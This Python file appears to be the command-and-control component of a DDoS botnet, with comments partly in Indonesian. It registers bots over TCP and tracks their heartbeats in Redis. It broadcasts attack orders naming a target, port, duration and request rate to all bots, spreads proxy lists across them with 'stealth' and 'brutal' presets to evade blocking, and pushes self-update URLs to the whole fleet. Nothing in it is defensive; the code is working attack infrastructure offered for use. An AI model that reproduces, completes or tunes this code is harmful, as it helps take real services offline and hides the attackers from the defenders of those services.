import asyncio
import json
import time
import random
import logging
from typing import Dict, Optional, List, Set, Any
from datetime import datetime
import socket

from app.core.config import settings
from app.core.logger import logger, log_bot_event
from app.core.redis_client import get_redis, RedisKeys
from app.core.models import BotStats, BotHeartbeat, BotRegister, AttackResult
from app.managers.proxy_manager import proxy_manager


# ================================================================
# OPTIMAL PROXY DISTRIBUTION CONFIG
# ================================================================
class ProxyDistributionConfig:
    """Optimal proxy distribution untuk berbagai situasi attack."""

    HIGH_BOT_HIGH_PROXY = {
        "max_proxies_per_bot": 200,
        "min_proxies_per_bot": 50,
        "overlap": 20,
        "refresh_interval": 180,
        "protocol_mix": {"http": 0.6, "socks5": 0.3, "socks4": 0.1},
        "speed_tier_min": "medium",
    }

    LOW_BOT_HIGH_PROXY = {
        "max_proxies_per_bot": 500,
        "min_proxies_per_bot": 100,
        "overlap": 50,
        "refresh_interval": 300,
        "protocol_mix": {"http": 0.5, "socks5": 0.4, "socks4": 0.1},
        "speed_tier_min": "fast",
    }

    HIGH_BOT_LOW_PROXY = {
        "max_proxies_per_bot": 100,
        "min_proxies_per_bot": 30,
        "overlap": 10,
        "refresh_interval": 120,
        "protocol_mix": {"http": 0.7, "socks5": 0.2, "socks4": 0.1},
        "speed_tier_min": "medium",
    }

    STEALTH_MODE = {
        "max_proxies_per_bot": 150,
        "min_proxies_per_bot": 50,
        "overlap": 30,
        "refresh_interval": 60,
        "protocol_mix": {"http": 0.2, "socks5": 0.6, "socks4": 0.2},
        "speed_tier_min": "fast",
    }

    BRUTAL_MODE = {
        "max_proxies_per_bot": 300,
        "min_proxies_per_bot": 100,
        "overlap": 50,
        "refresh_interval": 300,
        "protocol_mix": {"http": 0.8, "socks5": 0.15, "socks4": 0.05},
        "speed_tier_min": "medium",
    }


# ================================================================
# BOTNET MANAGER v8.1 — OPTIMAL
# ================================================================
class BotnetManager:
    """
    Manages bot connections, commands, and stats.
    - Handles TCP messages from bots
    - Sends commands to bots with OPTIMAL proxy distribution
    - Tracks bot status using Redis and active writers
    """

    def __init__(self):
        self.active_writers: Dict[str, asyncio.StreamWriter] = {}
        self._lock = asyncio.Lock()
        self._cleanup_task: Optional[asyncio.Task] = None
        self._running = False
        self._last_seen: Dict[str, int] = {}
        # FIX: Auto-detect optimal config based on bot count
        self._proxy_config = ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY

    # ===================== PUBLIC API =====================

    async def start(self):
        if self._running:
            return
        self._running = True
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        logger.info("BotnetManager started.")

    async def stop(self):
        self._running = False
        if self._cleanup_task:
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass
        async with self._lock:
            for writer in self.active_writers.values():
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
            self.active_writers.clear()
            self._last_seen.clear()
        logger.info("BotnetManager stopped.")

    async def handle_message(self, writer: asyncio.StreamWriter, msg: dict):
        msg_type = msg.get("type")
        bot_id = msg.get("id")

        if not bot_id:
            logger.warning("Message without bot ID, ignoring.")
            return

        if not isinstance(bot_id, str) or not bot_id.strip():
            logger.warning(f"Invalid bot ID received: {bot_id!r}. Check bot config.ini!")
            return

        bot_id = bot_id.strip()
        logger.info(f"📩 Received {msg_type} from bot {bot_id}")

        self._last_seen[bot_id] = int(time.time())

        if msg_type == "register":
            await self._handle_register(writer, msg)
        elif msg_type == "heartbeat":
            await self._handle_heartbeat(msg)
        elif msg_type == "attack_result":
            await self._handle_attack_result(msg)
        elif msg_type == "attack_progress":
            await self._handle_attack_progress(msg)
        elif msg_type == "attack_started":
            logger.info(f"Bot {bot_id} started attack {msg.get('attack_id')}")
        elif msg_type == "proxy_updated":
            logger.info(f"Bot {bot_id} updated proxies: {msg.get('count', 0)} proxies")
        elif msg_type == "proxy_refreshed":
            logger.info(f"Bot {bot_id} refreshed proxies for attack {msg.get('attack_id')}: {msg.get('new_count', 0)} new")
        elif msg_type == "pong":
            pass
        else:
            logger.warning(f"Unknown message type from {bot_id}: {msg_type}")

    # FIX: Auto-detect optimal config based on bot count
    def _get_optimal_config(self, bot_count: int, proxy_count: int) -> dict:
        """Auto-detect scenario terbaik berdasarkan bot count dan proxy count."""
        if bot_count <= 3 and proxy_count >= 1500:
            return ProxyDistributionConfig.LOW_BOT_HIGH_PROXY
        elif bot_count >= 10 and proxy_count <= 1000:
            return ProxyDistributionConfig.HIGH_BOT_LOW_PROXY
        elif bot_count <= 5 and proxy_count >= 1000:
            return ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
        else:
            return ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY

    # FIX: OPTIMAL proxy distribution
    async def broadcast_attack_with_proxies(self, attack_data: dict, proxies: List[str]) -> dict:
        """
        Broadcast attack ke SEMUA bot dengan OPTIMAL proxy distribution.
        Auto-detect scenario berdasarkan bot count dan proxy count.
        """
        async with self._lock:
            if not self.active_writers:
                logger.warning("[ATTACK] No bots connected!")
                return {"status": "failed", "reason": "no_bots", "bots": 0}

            bot_count = len(self.active_writers)

        # FIX: Auto-detect optimal config
        config = self._get_optimal_config(bot_count, len(proxies))
        self._proxy_config = config

        proxies_per_bot = min(
            config["max_proxies_per_bot"],
            max(config["min_proxies_per_bot"],
                len(proxies) // bot_count + config["overlap"])
        )

        logger.info(f"[ATTACK] OPTIMAL MODE: {bot_count} bots, {len(proxies)} proxies, "
                    f"{proxies_per_bot}/bot, refresh={config['refresh_interval']}s, "
                    f"speed>={config['speed_tier_min']}")

        random.shuffle(proxies)

        async with self._lock:
            bot_list = list(self.active_writers.items())

        sent_count = 0
        failed_count = 0

        for i, (bot_id, writer) in enumerate(bot_list):
            if writer.is_closing():
                failed_count += 1
                continue

            start_idx = (i * proxies_per_bot) % len(proxies)
            end_idx = start_idx + proxies_per_bot
            if end_idx > len(proxies):
                bot_proxies = proxies[start_idx:] + proxies[:end_idx - len(proxies)]
            else:
                bot_proxies = proxies[start_idx:end_idx]

            bot_attack_cmd = {
                "cmd": "attack",
                "attack_id": attack_data.get("attack_id", str(time.time())),
                "method": attack_data["method"],
                "target": attack_data["target"],
                "port": attack_data.get("port", 80),
                "duration": attack_data["duration"],
                "hold_time": attack_data.get("hold_time", 0),
                "rps_limit": attack_data.get("rps_limit", 1500),
                "extra": attack_data.get("extra", ""),
                "proxies": bot_proxies,
            }

            try:
                await self._send_to_writer(writer, json.dumps(bot_attack_cmd) + "
")
                sent_count += 1
            except Exception as e:
                failed_count += 1
                logger.error(f"[ATTACK] Failed to send to bot {bot_id}: {e}")

        logger.info(f"[ATTACK] Launched: {sent_count} bots, {failed_count} failed, "
                    f"{len(proxies)} proxies, {proxies_per_bot}/bot")

        return {
            "status": "launched",
            "bots": sent_count,
            "failed": failed_count,
            "total_proxies": len(proxies),
            "proxies_per_bot": proxies_per_bot,
            "mode": self._get_mode_name(config),
        }

    def _get_mode_name(self, config: dict) -> str:
        """Get mode name for logging."""
        for name, cfg in vars(ProxyDistributionConfig).items():
            if isinstance(cfg, dict) and cfg == config:
                return name
        return "CUSTOM"

    # FIX: OPTIMAL mid-attack proxy refresh
    async def broadcast_proxy_refresh(self, attack_id: str, proxies: List[str]) -> dict:
        """Broadcast proxy_refresh dengan optimal settings."""
        async with self._lock:
            if not self.active_writers:
                return {"status": "failed", "reason": "no_bots"}

            bot_count = len(self.active_writers)

        config = self._proxy_config
        proxies_per_bot = min(
            config["max_proxies_per_bot"] - 50,  # Sedikit lebih sedikit dari awal
            max(config["min_proxies_per_bot"],
                len(proxies) // bot_count + config["overlap"] // 2)
        )

        random.shuffle(proxies)

        async with self._lock:
            bot_list = list(self.active_writers.items())

        sent_count = 0
        for i, (bot_id, writer) in enumerate(bot_list):
            if writer.is_closing():
                continue

            start_idx = (i * proxies_per_bot) % len(proxies)
            end_idx = start_idx + proxies_per_bot
            if end_idx > len(proxies):
                bot_proxies = proxies[start_idx:] + proxies[:end_idx - len(proxies)]
            else:
                bot_proxies = proxies[start_idx:end_idx]

            refresh_cmd = {
                "cmd": "proxy_refresh",
                "attack_id": attack_id,
                "proxies": bot_proxies,
            }

            try:
                await self._send_to_writer(writer, json.dumps(refresh_cmd) + "
")
                sent_count += 1
            except Exception as e:
                logger.error(f"[REFRESH] Failed to send to bot {bot_id}: {e}")

        logger.info(f"[REFRESH] Sent to {sent_count} bots for attack {attack_id}")
        return {"status": "refreshed", "bots": sent_count}

    async def broadcast_command(self, command: dict, exclude: Optional[List[str]] = None):
        """Send a command to all connected bots."""
        async with self._lock:
            valid_items = [
                (bid, w) for bid, w in self.active_writers.items()
                if not w.is_closing()
            ]
            writers = [w for _, w in valid_items]
            bot_ids = [bid for bid, _ in valid_items]
            logger.info(f"📢 Active writers before broadcast: {bot_ids}")

        if not writers:
            logger.warning(f"No bots connected to broadcast command '{command.get('cmd')}'.")
            return

        logger.info(f"Broadcasting command '{command.get('cmd')}' to {len(writers)} bots: {bot_ids}")

        cmd_json = json.dumps(command) + "
"
        excluded_set = set(exclude) if exclude else set()
        tasks = []
        async with self._lock:
            for bot_id, writer in self.active_writers.items():
                if bot_id in excluded_set:
                    continue
                if writer.is_closing():
                    logger.warning(f"Bot {bot_id} writer is closing, skipping.")
                    continue
                tasks.append(self._send_to_writer(writer, cmd_json))
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def send_to_bot(self, bot_id: str, command: dict) -> bool:
        """Send a command to a specific bot."""
        async with self._lock:
            writer = self.active_writers.get(bot_id)
            if not writer or writer.is_closing():
                return False
        cmd_json = json.dumps(command) + "
"
        return await self._send_to_writer(writer, cmd_json)

    async def get_bot_stats(self) -> BotStats:
        redis = await get_redis()
        async with self._lock:
            active_count = len(self.active_writers)

        total_bots_set = f"{RedisKeys.PREFIX}bots:registered"
        total_count = await redis.scard(total_bots_set)

        total_requests_key = f"{RedisKeys.PREFIX}stats:bot_total_requests"
        total_requests = int(await redis.get(total_requests_key) or 0)

        rpm_key = f"{RedisKeys.PREFIX}stats:bot_rpm"
        rpm = int(await redis.get(rpm_key) or 0)

        return BotStats(
            active=active_count,
            total=total_count,
            avg_rpm=rpm,
            total_requests=total_requests
        )

    async def update_proxies_for_bots(self):
        """Send updated proxy list to all bots."""
        proxies = await proxy_manager.get_alive_proxies()
        proxy_strings = [str(p) for p in proxies]
        command = {
            "cmd": "proxy_update",
            "proxies": proxy_strings
        }
        await self.broadcast_command(command)
        logger.info(f"Sent proxy update ({len(proxy_strings)} proxies) to all bots.")

    async def update_self_for_bots(self, url: str):
        """Send self-update command to all bots."""
        command = {
            "cmd": "update_self",
            "url": url
        }
        await self.broadcast_command(command)
        logger.info(f"Sent self-update command to all bots: {url}")

    async def remove_bot_on_disconnect(self, bot_id: str):
        """Remove bot immediately when its TCP connection drops."""
        async with self._lock:
            writer = self.active_writers.pop(bot_id, None)
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
                logger.info(f"✅ Bot {bot_id} removed from active_writers on disconnect")
            self._last_seen.pop(bot_id, None)

        redis = await get_redis()
        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
        await redis.hset(bot_key, "last_heartbeat", 0)
        log_bot_event(bot_id, "disconnected", {"reason": "connection_lost"})

    # ===================== INTERNAL HANDLERS =====================

    async def _handle_register(self, writer: asyncio.StreamWriter, msg: dict):
        bot_id = msg.get("id", "").strip()
        if not bot_id:
            logger.warning("Register message with empty bot_id, ignoring.")
            return

        addr = writer.get_extra_info('peername')
        ip = addr[0] if addr else "unknown"

        logger.info(f"📝 Processing register for bot {bot_id} from {ip}")

        async with self._lock:
            old_writer = self.active_writers.get(bot_id)
            if old_writer and old_writer is not writer:
                try:
                    old_writer.close()
                    await old_writer.wait_closed()
                except:
                    pass
                logger.info(f"Closed old writer for bot {bot_id}")
            self.active_writers[bot_id] = writer
            self._last_seen[bot_id] = int(time.time())
            logger.info(f"🔐 Added bot {bot_id} to active_writers. Total: {len(self.active_writers)}")

        redis = await get_redis()
        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
        now = int(time.time())
        await redis.hset(bot_key, mapping={
            "id": bot_id,
            "ip": ip,
            "registered_at": now,
            "last_heartbeat": now
        })
        await redis.sadd(f"{RedisKeys.PREFIX}bots:registered", bot_id)

        log_bot_event(bot_id, "registered", {"ip": ip})
        logger.info(f"✅ Bot {bot_id} registered from {ip}. Total bots: {len(self.active_writers)}")

    async def _handle_heartbeat(self, msg: dict):
        bot_id = msg.get("id", "").strip()
        if not bot_id:
            logger.warning("Heartbeat with empty bot_id, ignoring.")
            return
        now = int(time.time())
        logger.info(f"💓 Heartbeat received from bot {bot_id}")
        redis = await get_redis()
        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
        await redis.hset(bot_key, "last_heartbeat", now)

    async def _handle_attack_result(self, msg: dict):
        from app.managers.attack_manager import attack_manager

        bot_id = msg.get("id")
        attack_id = msg.get("attack_id")
        total_requests = msg.get("total_requests", 0)
        rps = msg.get("rps", 0)
        proxy_requests = msg.get("proxy_requests", 0)
        direct_requests = msg.get("direct_requests", 0)

        if not attack_id:
            logger.warning(f"Attack result from {bot_id} missing attack_id")
            return

        logger.info(f"📊 Final result from {bot_id} for {attack_id}: {total_requests} reqs, {rps} RPS, "
                    f"proxy={proxy_requests}, direct={direct_requests}")

        if attack_id in attack_manager.active_attacks:
            attack = attack_manager.active_attacks.get(attack_id)
            if attack:
                attack.total_requests = total_requests
                attack.rps = rps
                await attack_manager._save_attack_to_redis(attack)
                log_bot_event(bot_id, "attack_completed", {
                    "attack_id": attack_id,
                    "total_requests": total_requests,
                    "rps": rps,
                    "proxy_requests": proxy_requests,
                    "direct_requests": direct_requests,
                })

        redis = await get_redis()
        total_req_key = f"{RedisKeys.PREFIX}stats:bot_total_requests"
        await redis.incrby(total_req_key, total_requests)

    async def _handle_attack_progress(self, msg: dict):
        from app.managers.attack_manager import attack_manager

        bot_id = msg.get("id")
        attack_id = msg.get("attack_id")
        delta_requests = msg.get("delta_requests", 0)
        total_requests = msg.get("total_requests", 0)
        current_rps = msg.get("current_rps", 0)
        success_requests = msg.get("success_requests", 0)
        proxy_requests = msg.get("proxy_requests", 0)
        direct_requests = msg.get("direct_requests", 0)
        proxy_refresh_count = msg.get("proxy_refresh_count", 0)
        proxy_pool_alive = msg.get("proxy_pool_alive", 0)

        if not attack_id:
            logger.warning(f"Attack progress from {bot_id} missing attack_id")
            return

        logger.debug(f"📈 Progress from {bot_id} for {attack_id}: +{delta_requests} reqs, "
                     f"{current_rps} RPS, proxy={proxy_requests}, pool={proxy_pool_alive}")

        if attack_id in attack_manager.active_attacks:
            attack = attack_manager.active_attacks.get(attack_id)
            if attack:
                attack.total_requests += delta_requests
                attack.rps = current_rps
                await attack_manager._save_attack_to_redis(attack)

    # ===================== SEND HELPERS =====================

    async def _send_to_writer(self, writer: asyncio.StreamWriter, data: str) -> bool:
        try:
            writer.write(data.encode())
            await writer.drain()
            return True
        except Exception as e:
            logger.error(f"Error sending to writer: {e}")
            return False

    # ===================== CLEANUP =====================

    async def _cleanup_loop(self):
        while self._running:
            await asyncio.sleep(10)
            try:
                await self._cleanup_dead_bots()
            except Exception as e:
                logger.error(f"Error in cleanup loop: {e}")

    async def _cleanup_dead_bots(self):
        now = int(time.time())
        stale_threshold = 60

        async with self._lock:
            bot_ids = list(self.active_writers.keys())

        dead_bots = []
        for bot_id in bot_ids:
            last_seen = self._last_seen.get(bot_id, 0)
            if last_seen and (now - last_seen) <= stale_threshold:
                continue

            redis = await get_redis()
            bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
            last_hb = await redis.hget(bot_key, "last_heartbeat")
            if last_hb:
                last_hb = int(last_hb)
                if last_hb == 0:
                    dead_bots.append(bot_id)
                elif (now - last_hb) > stale_threshold:
                    dead_bots.append(bot_id)
                    logger.debug(f"Bot {bot_id} stale heartbeat: {now - last_hb}s ago")
            else:
                dead_bots.append(bot_id)
                logger.debug(f"Bot {bot_id} has no heartbeat record")

        async with self._lock:
            for bot_id, writer in list(self.active_writers.items()):
                if writer.is_closing():
                    if bot_id not in dead_bots:
                        dead_bots.append(bot_id)
                    logger.debug(f"Bot {bot_id} writer is closing")

        for bot_id in dead_bots:
            await self._remove_bot(bot_id)

        if dead_bots:
            logger.info(f"Removed {len(dead_bots)} stale bots: {dead_bots}")

    async def _remove_bot(self, bot_id: str):
        logger.info(f"🗑️ Removing bot {bot_id} from active_writers")

        async with self._lock:
            writer = self.active_writers.pop(bot_id, None)
            self._last_seen.pop(bot_id, None)
        if writer:
            try:
                writer.close()
                await writer.wait_closed()
            except:
                pass

        redis = await get_redis()
        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
        await redis.hset(bot_key, "last_heartbeat", 0)

        log_bot_event(bot_id, "disconnected", {"reason": "stale heartbeat"})

    # ===================== STATUS =====================

    async def get_active_bot_ids(self) -> List[str]:
        async with self._lock:
            return list(self.active_writers.keys())

    def is_bot_online(self, bot_id: str) -> bool:
        writer = self.active_writers.get(bot_id)
        return writer is not None and not writer.is_closing()


# ========== SINGLETON INSTANCE ==========
botnet_manager = BotnetManager()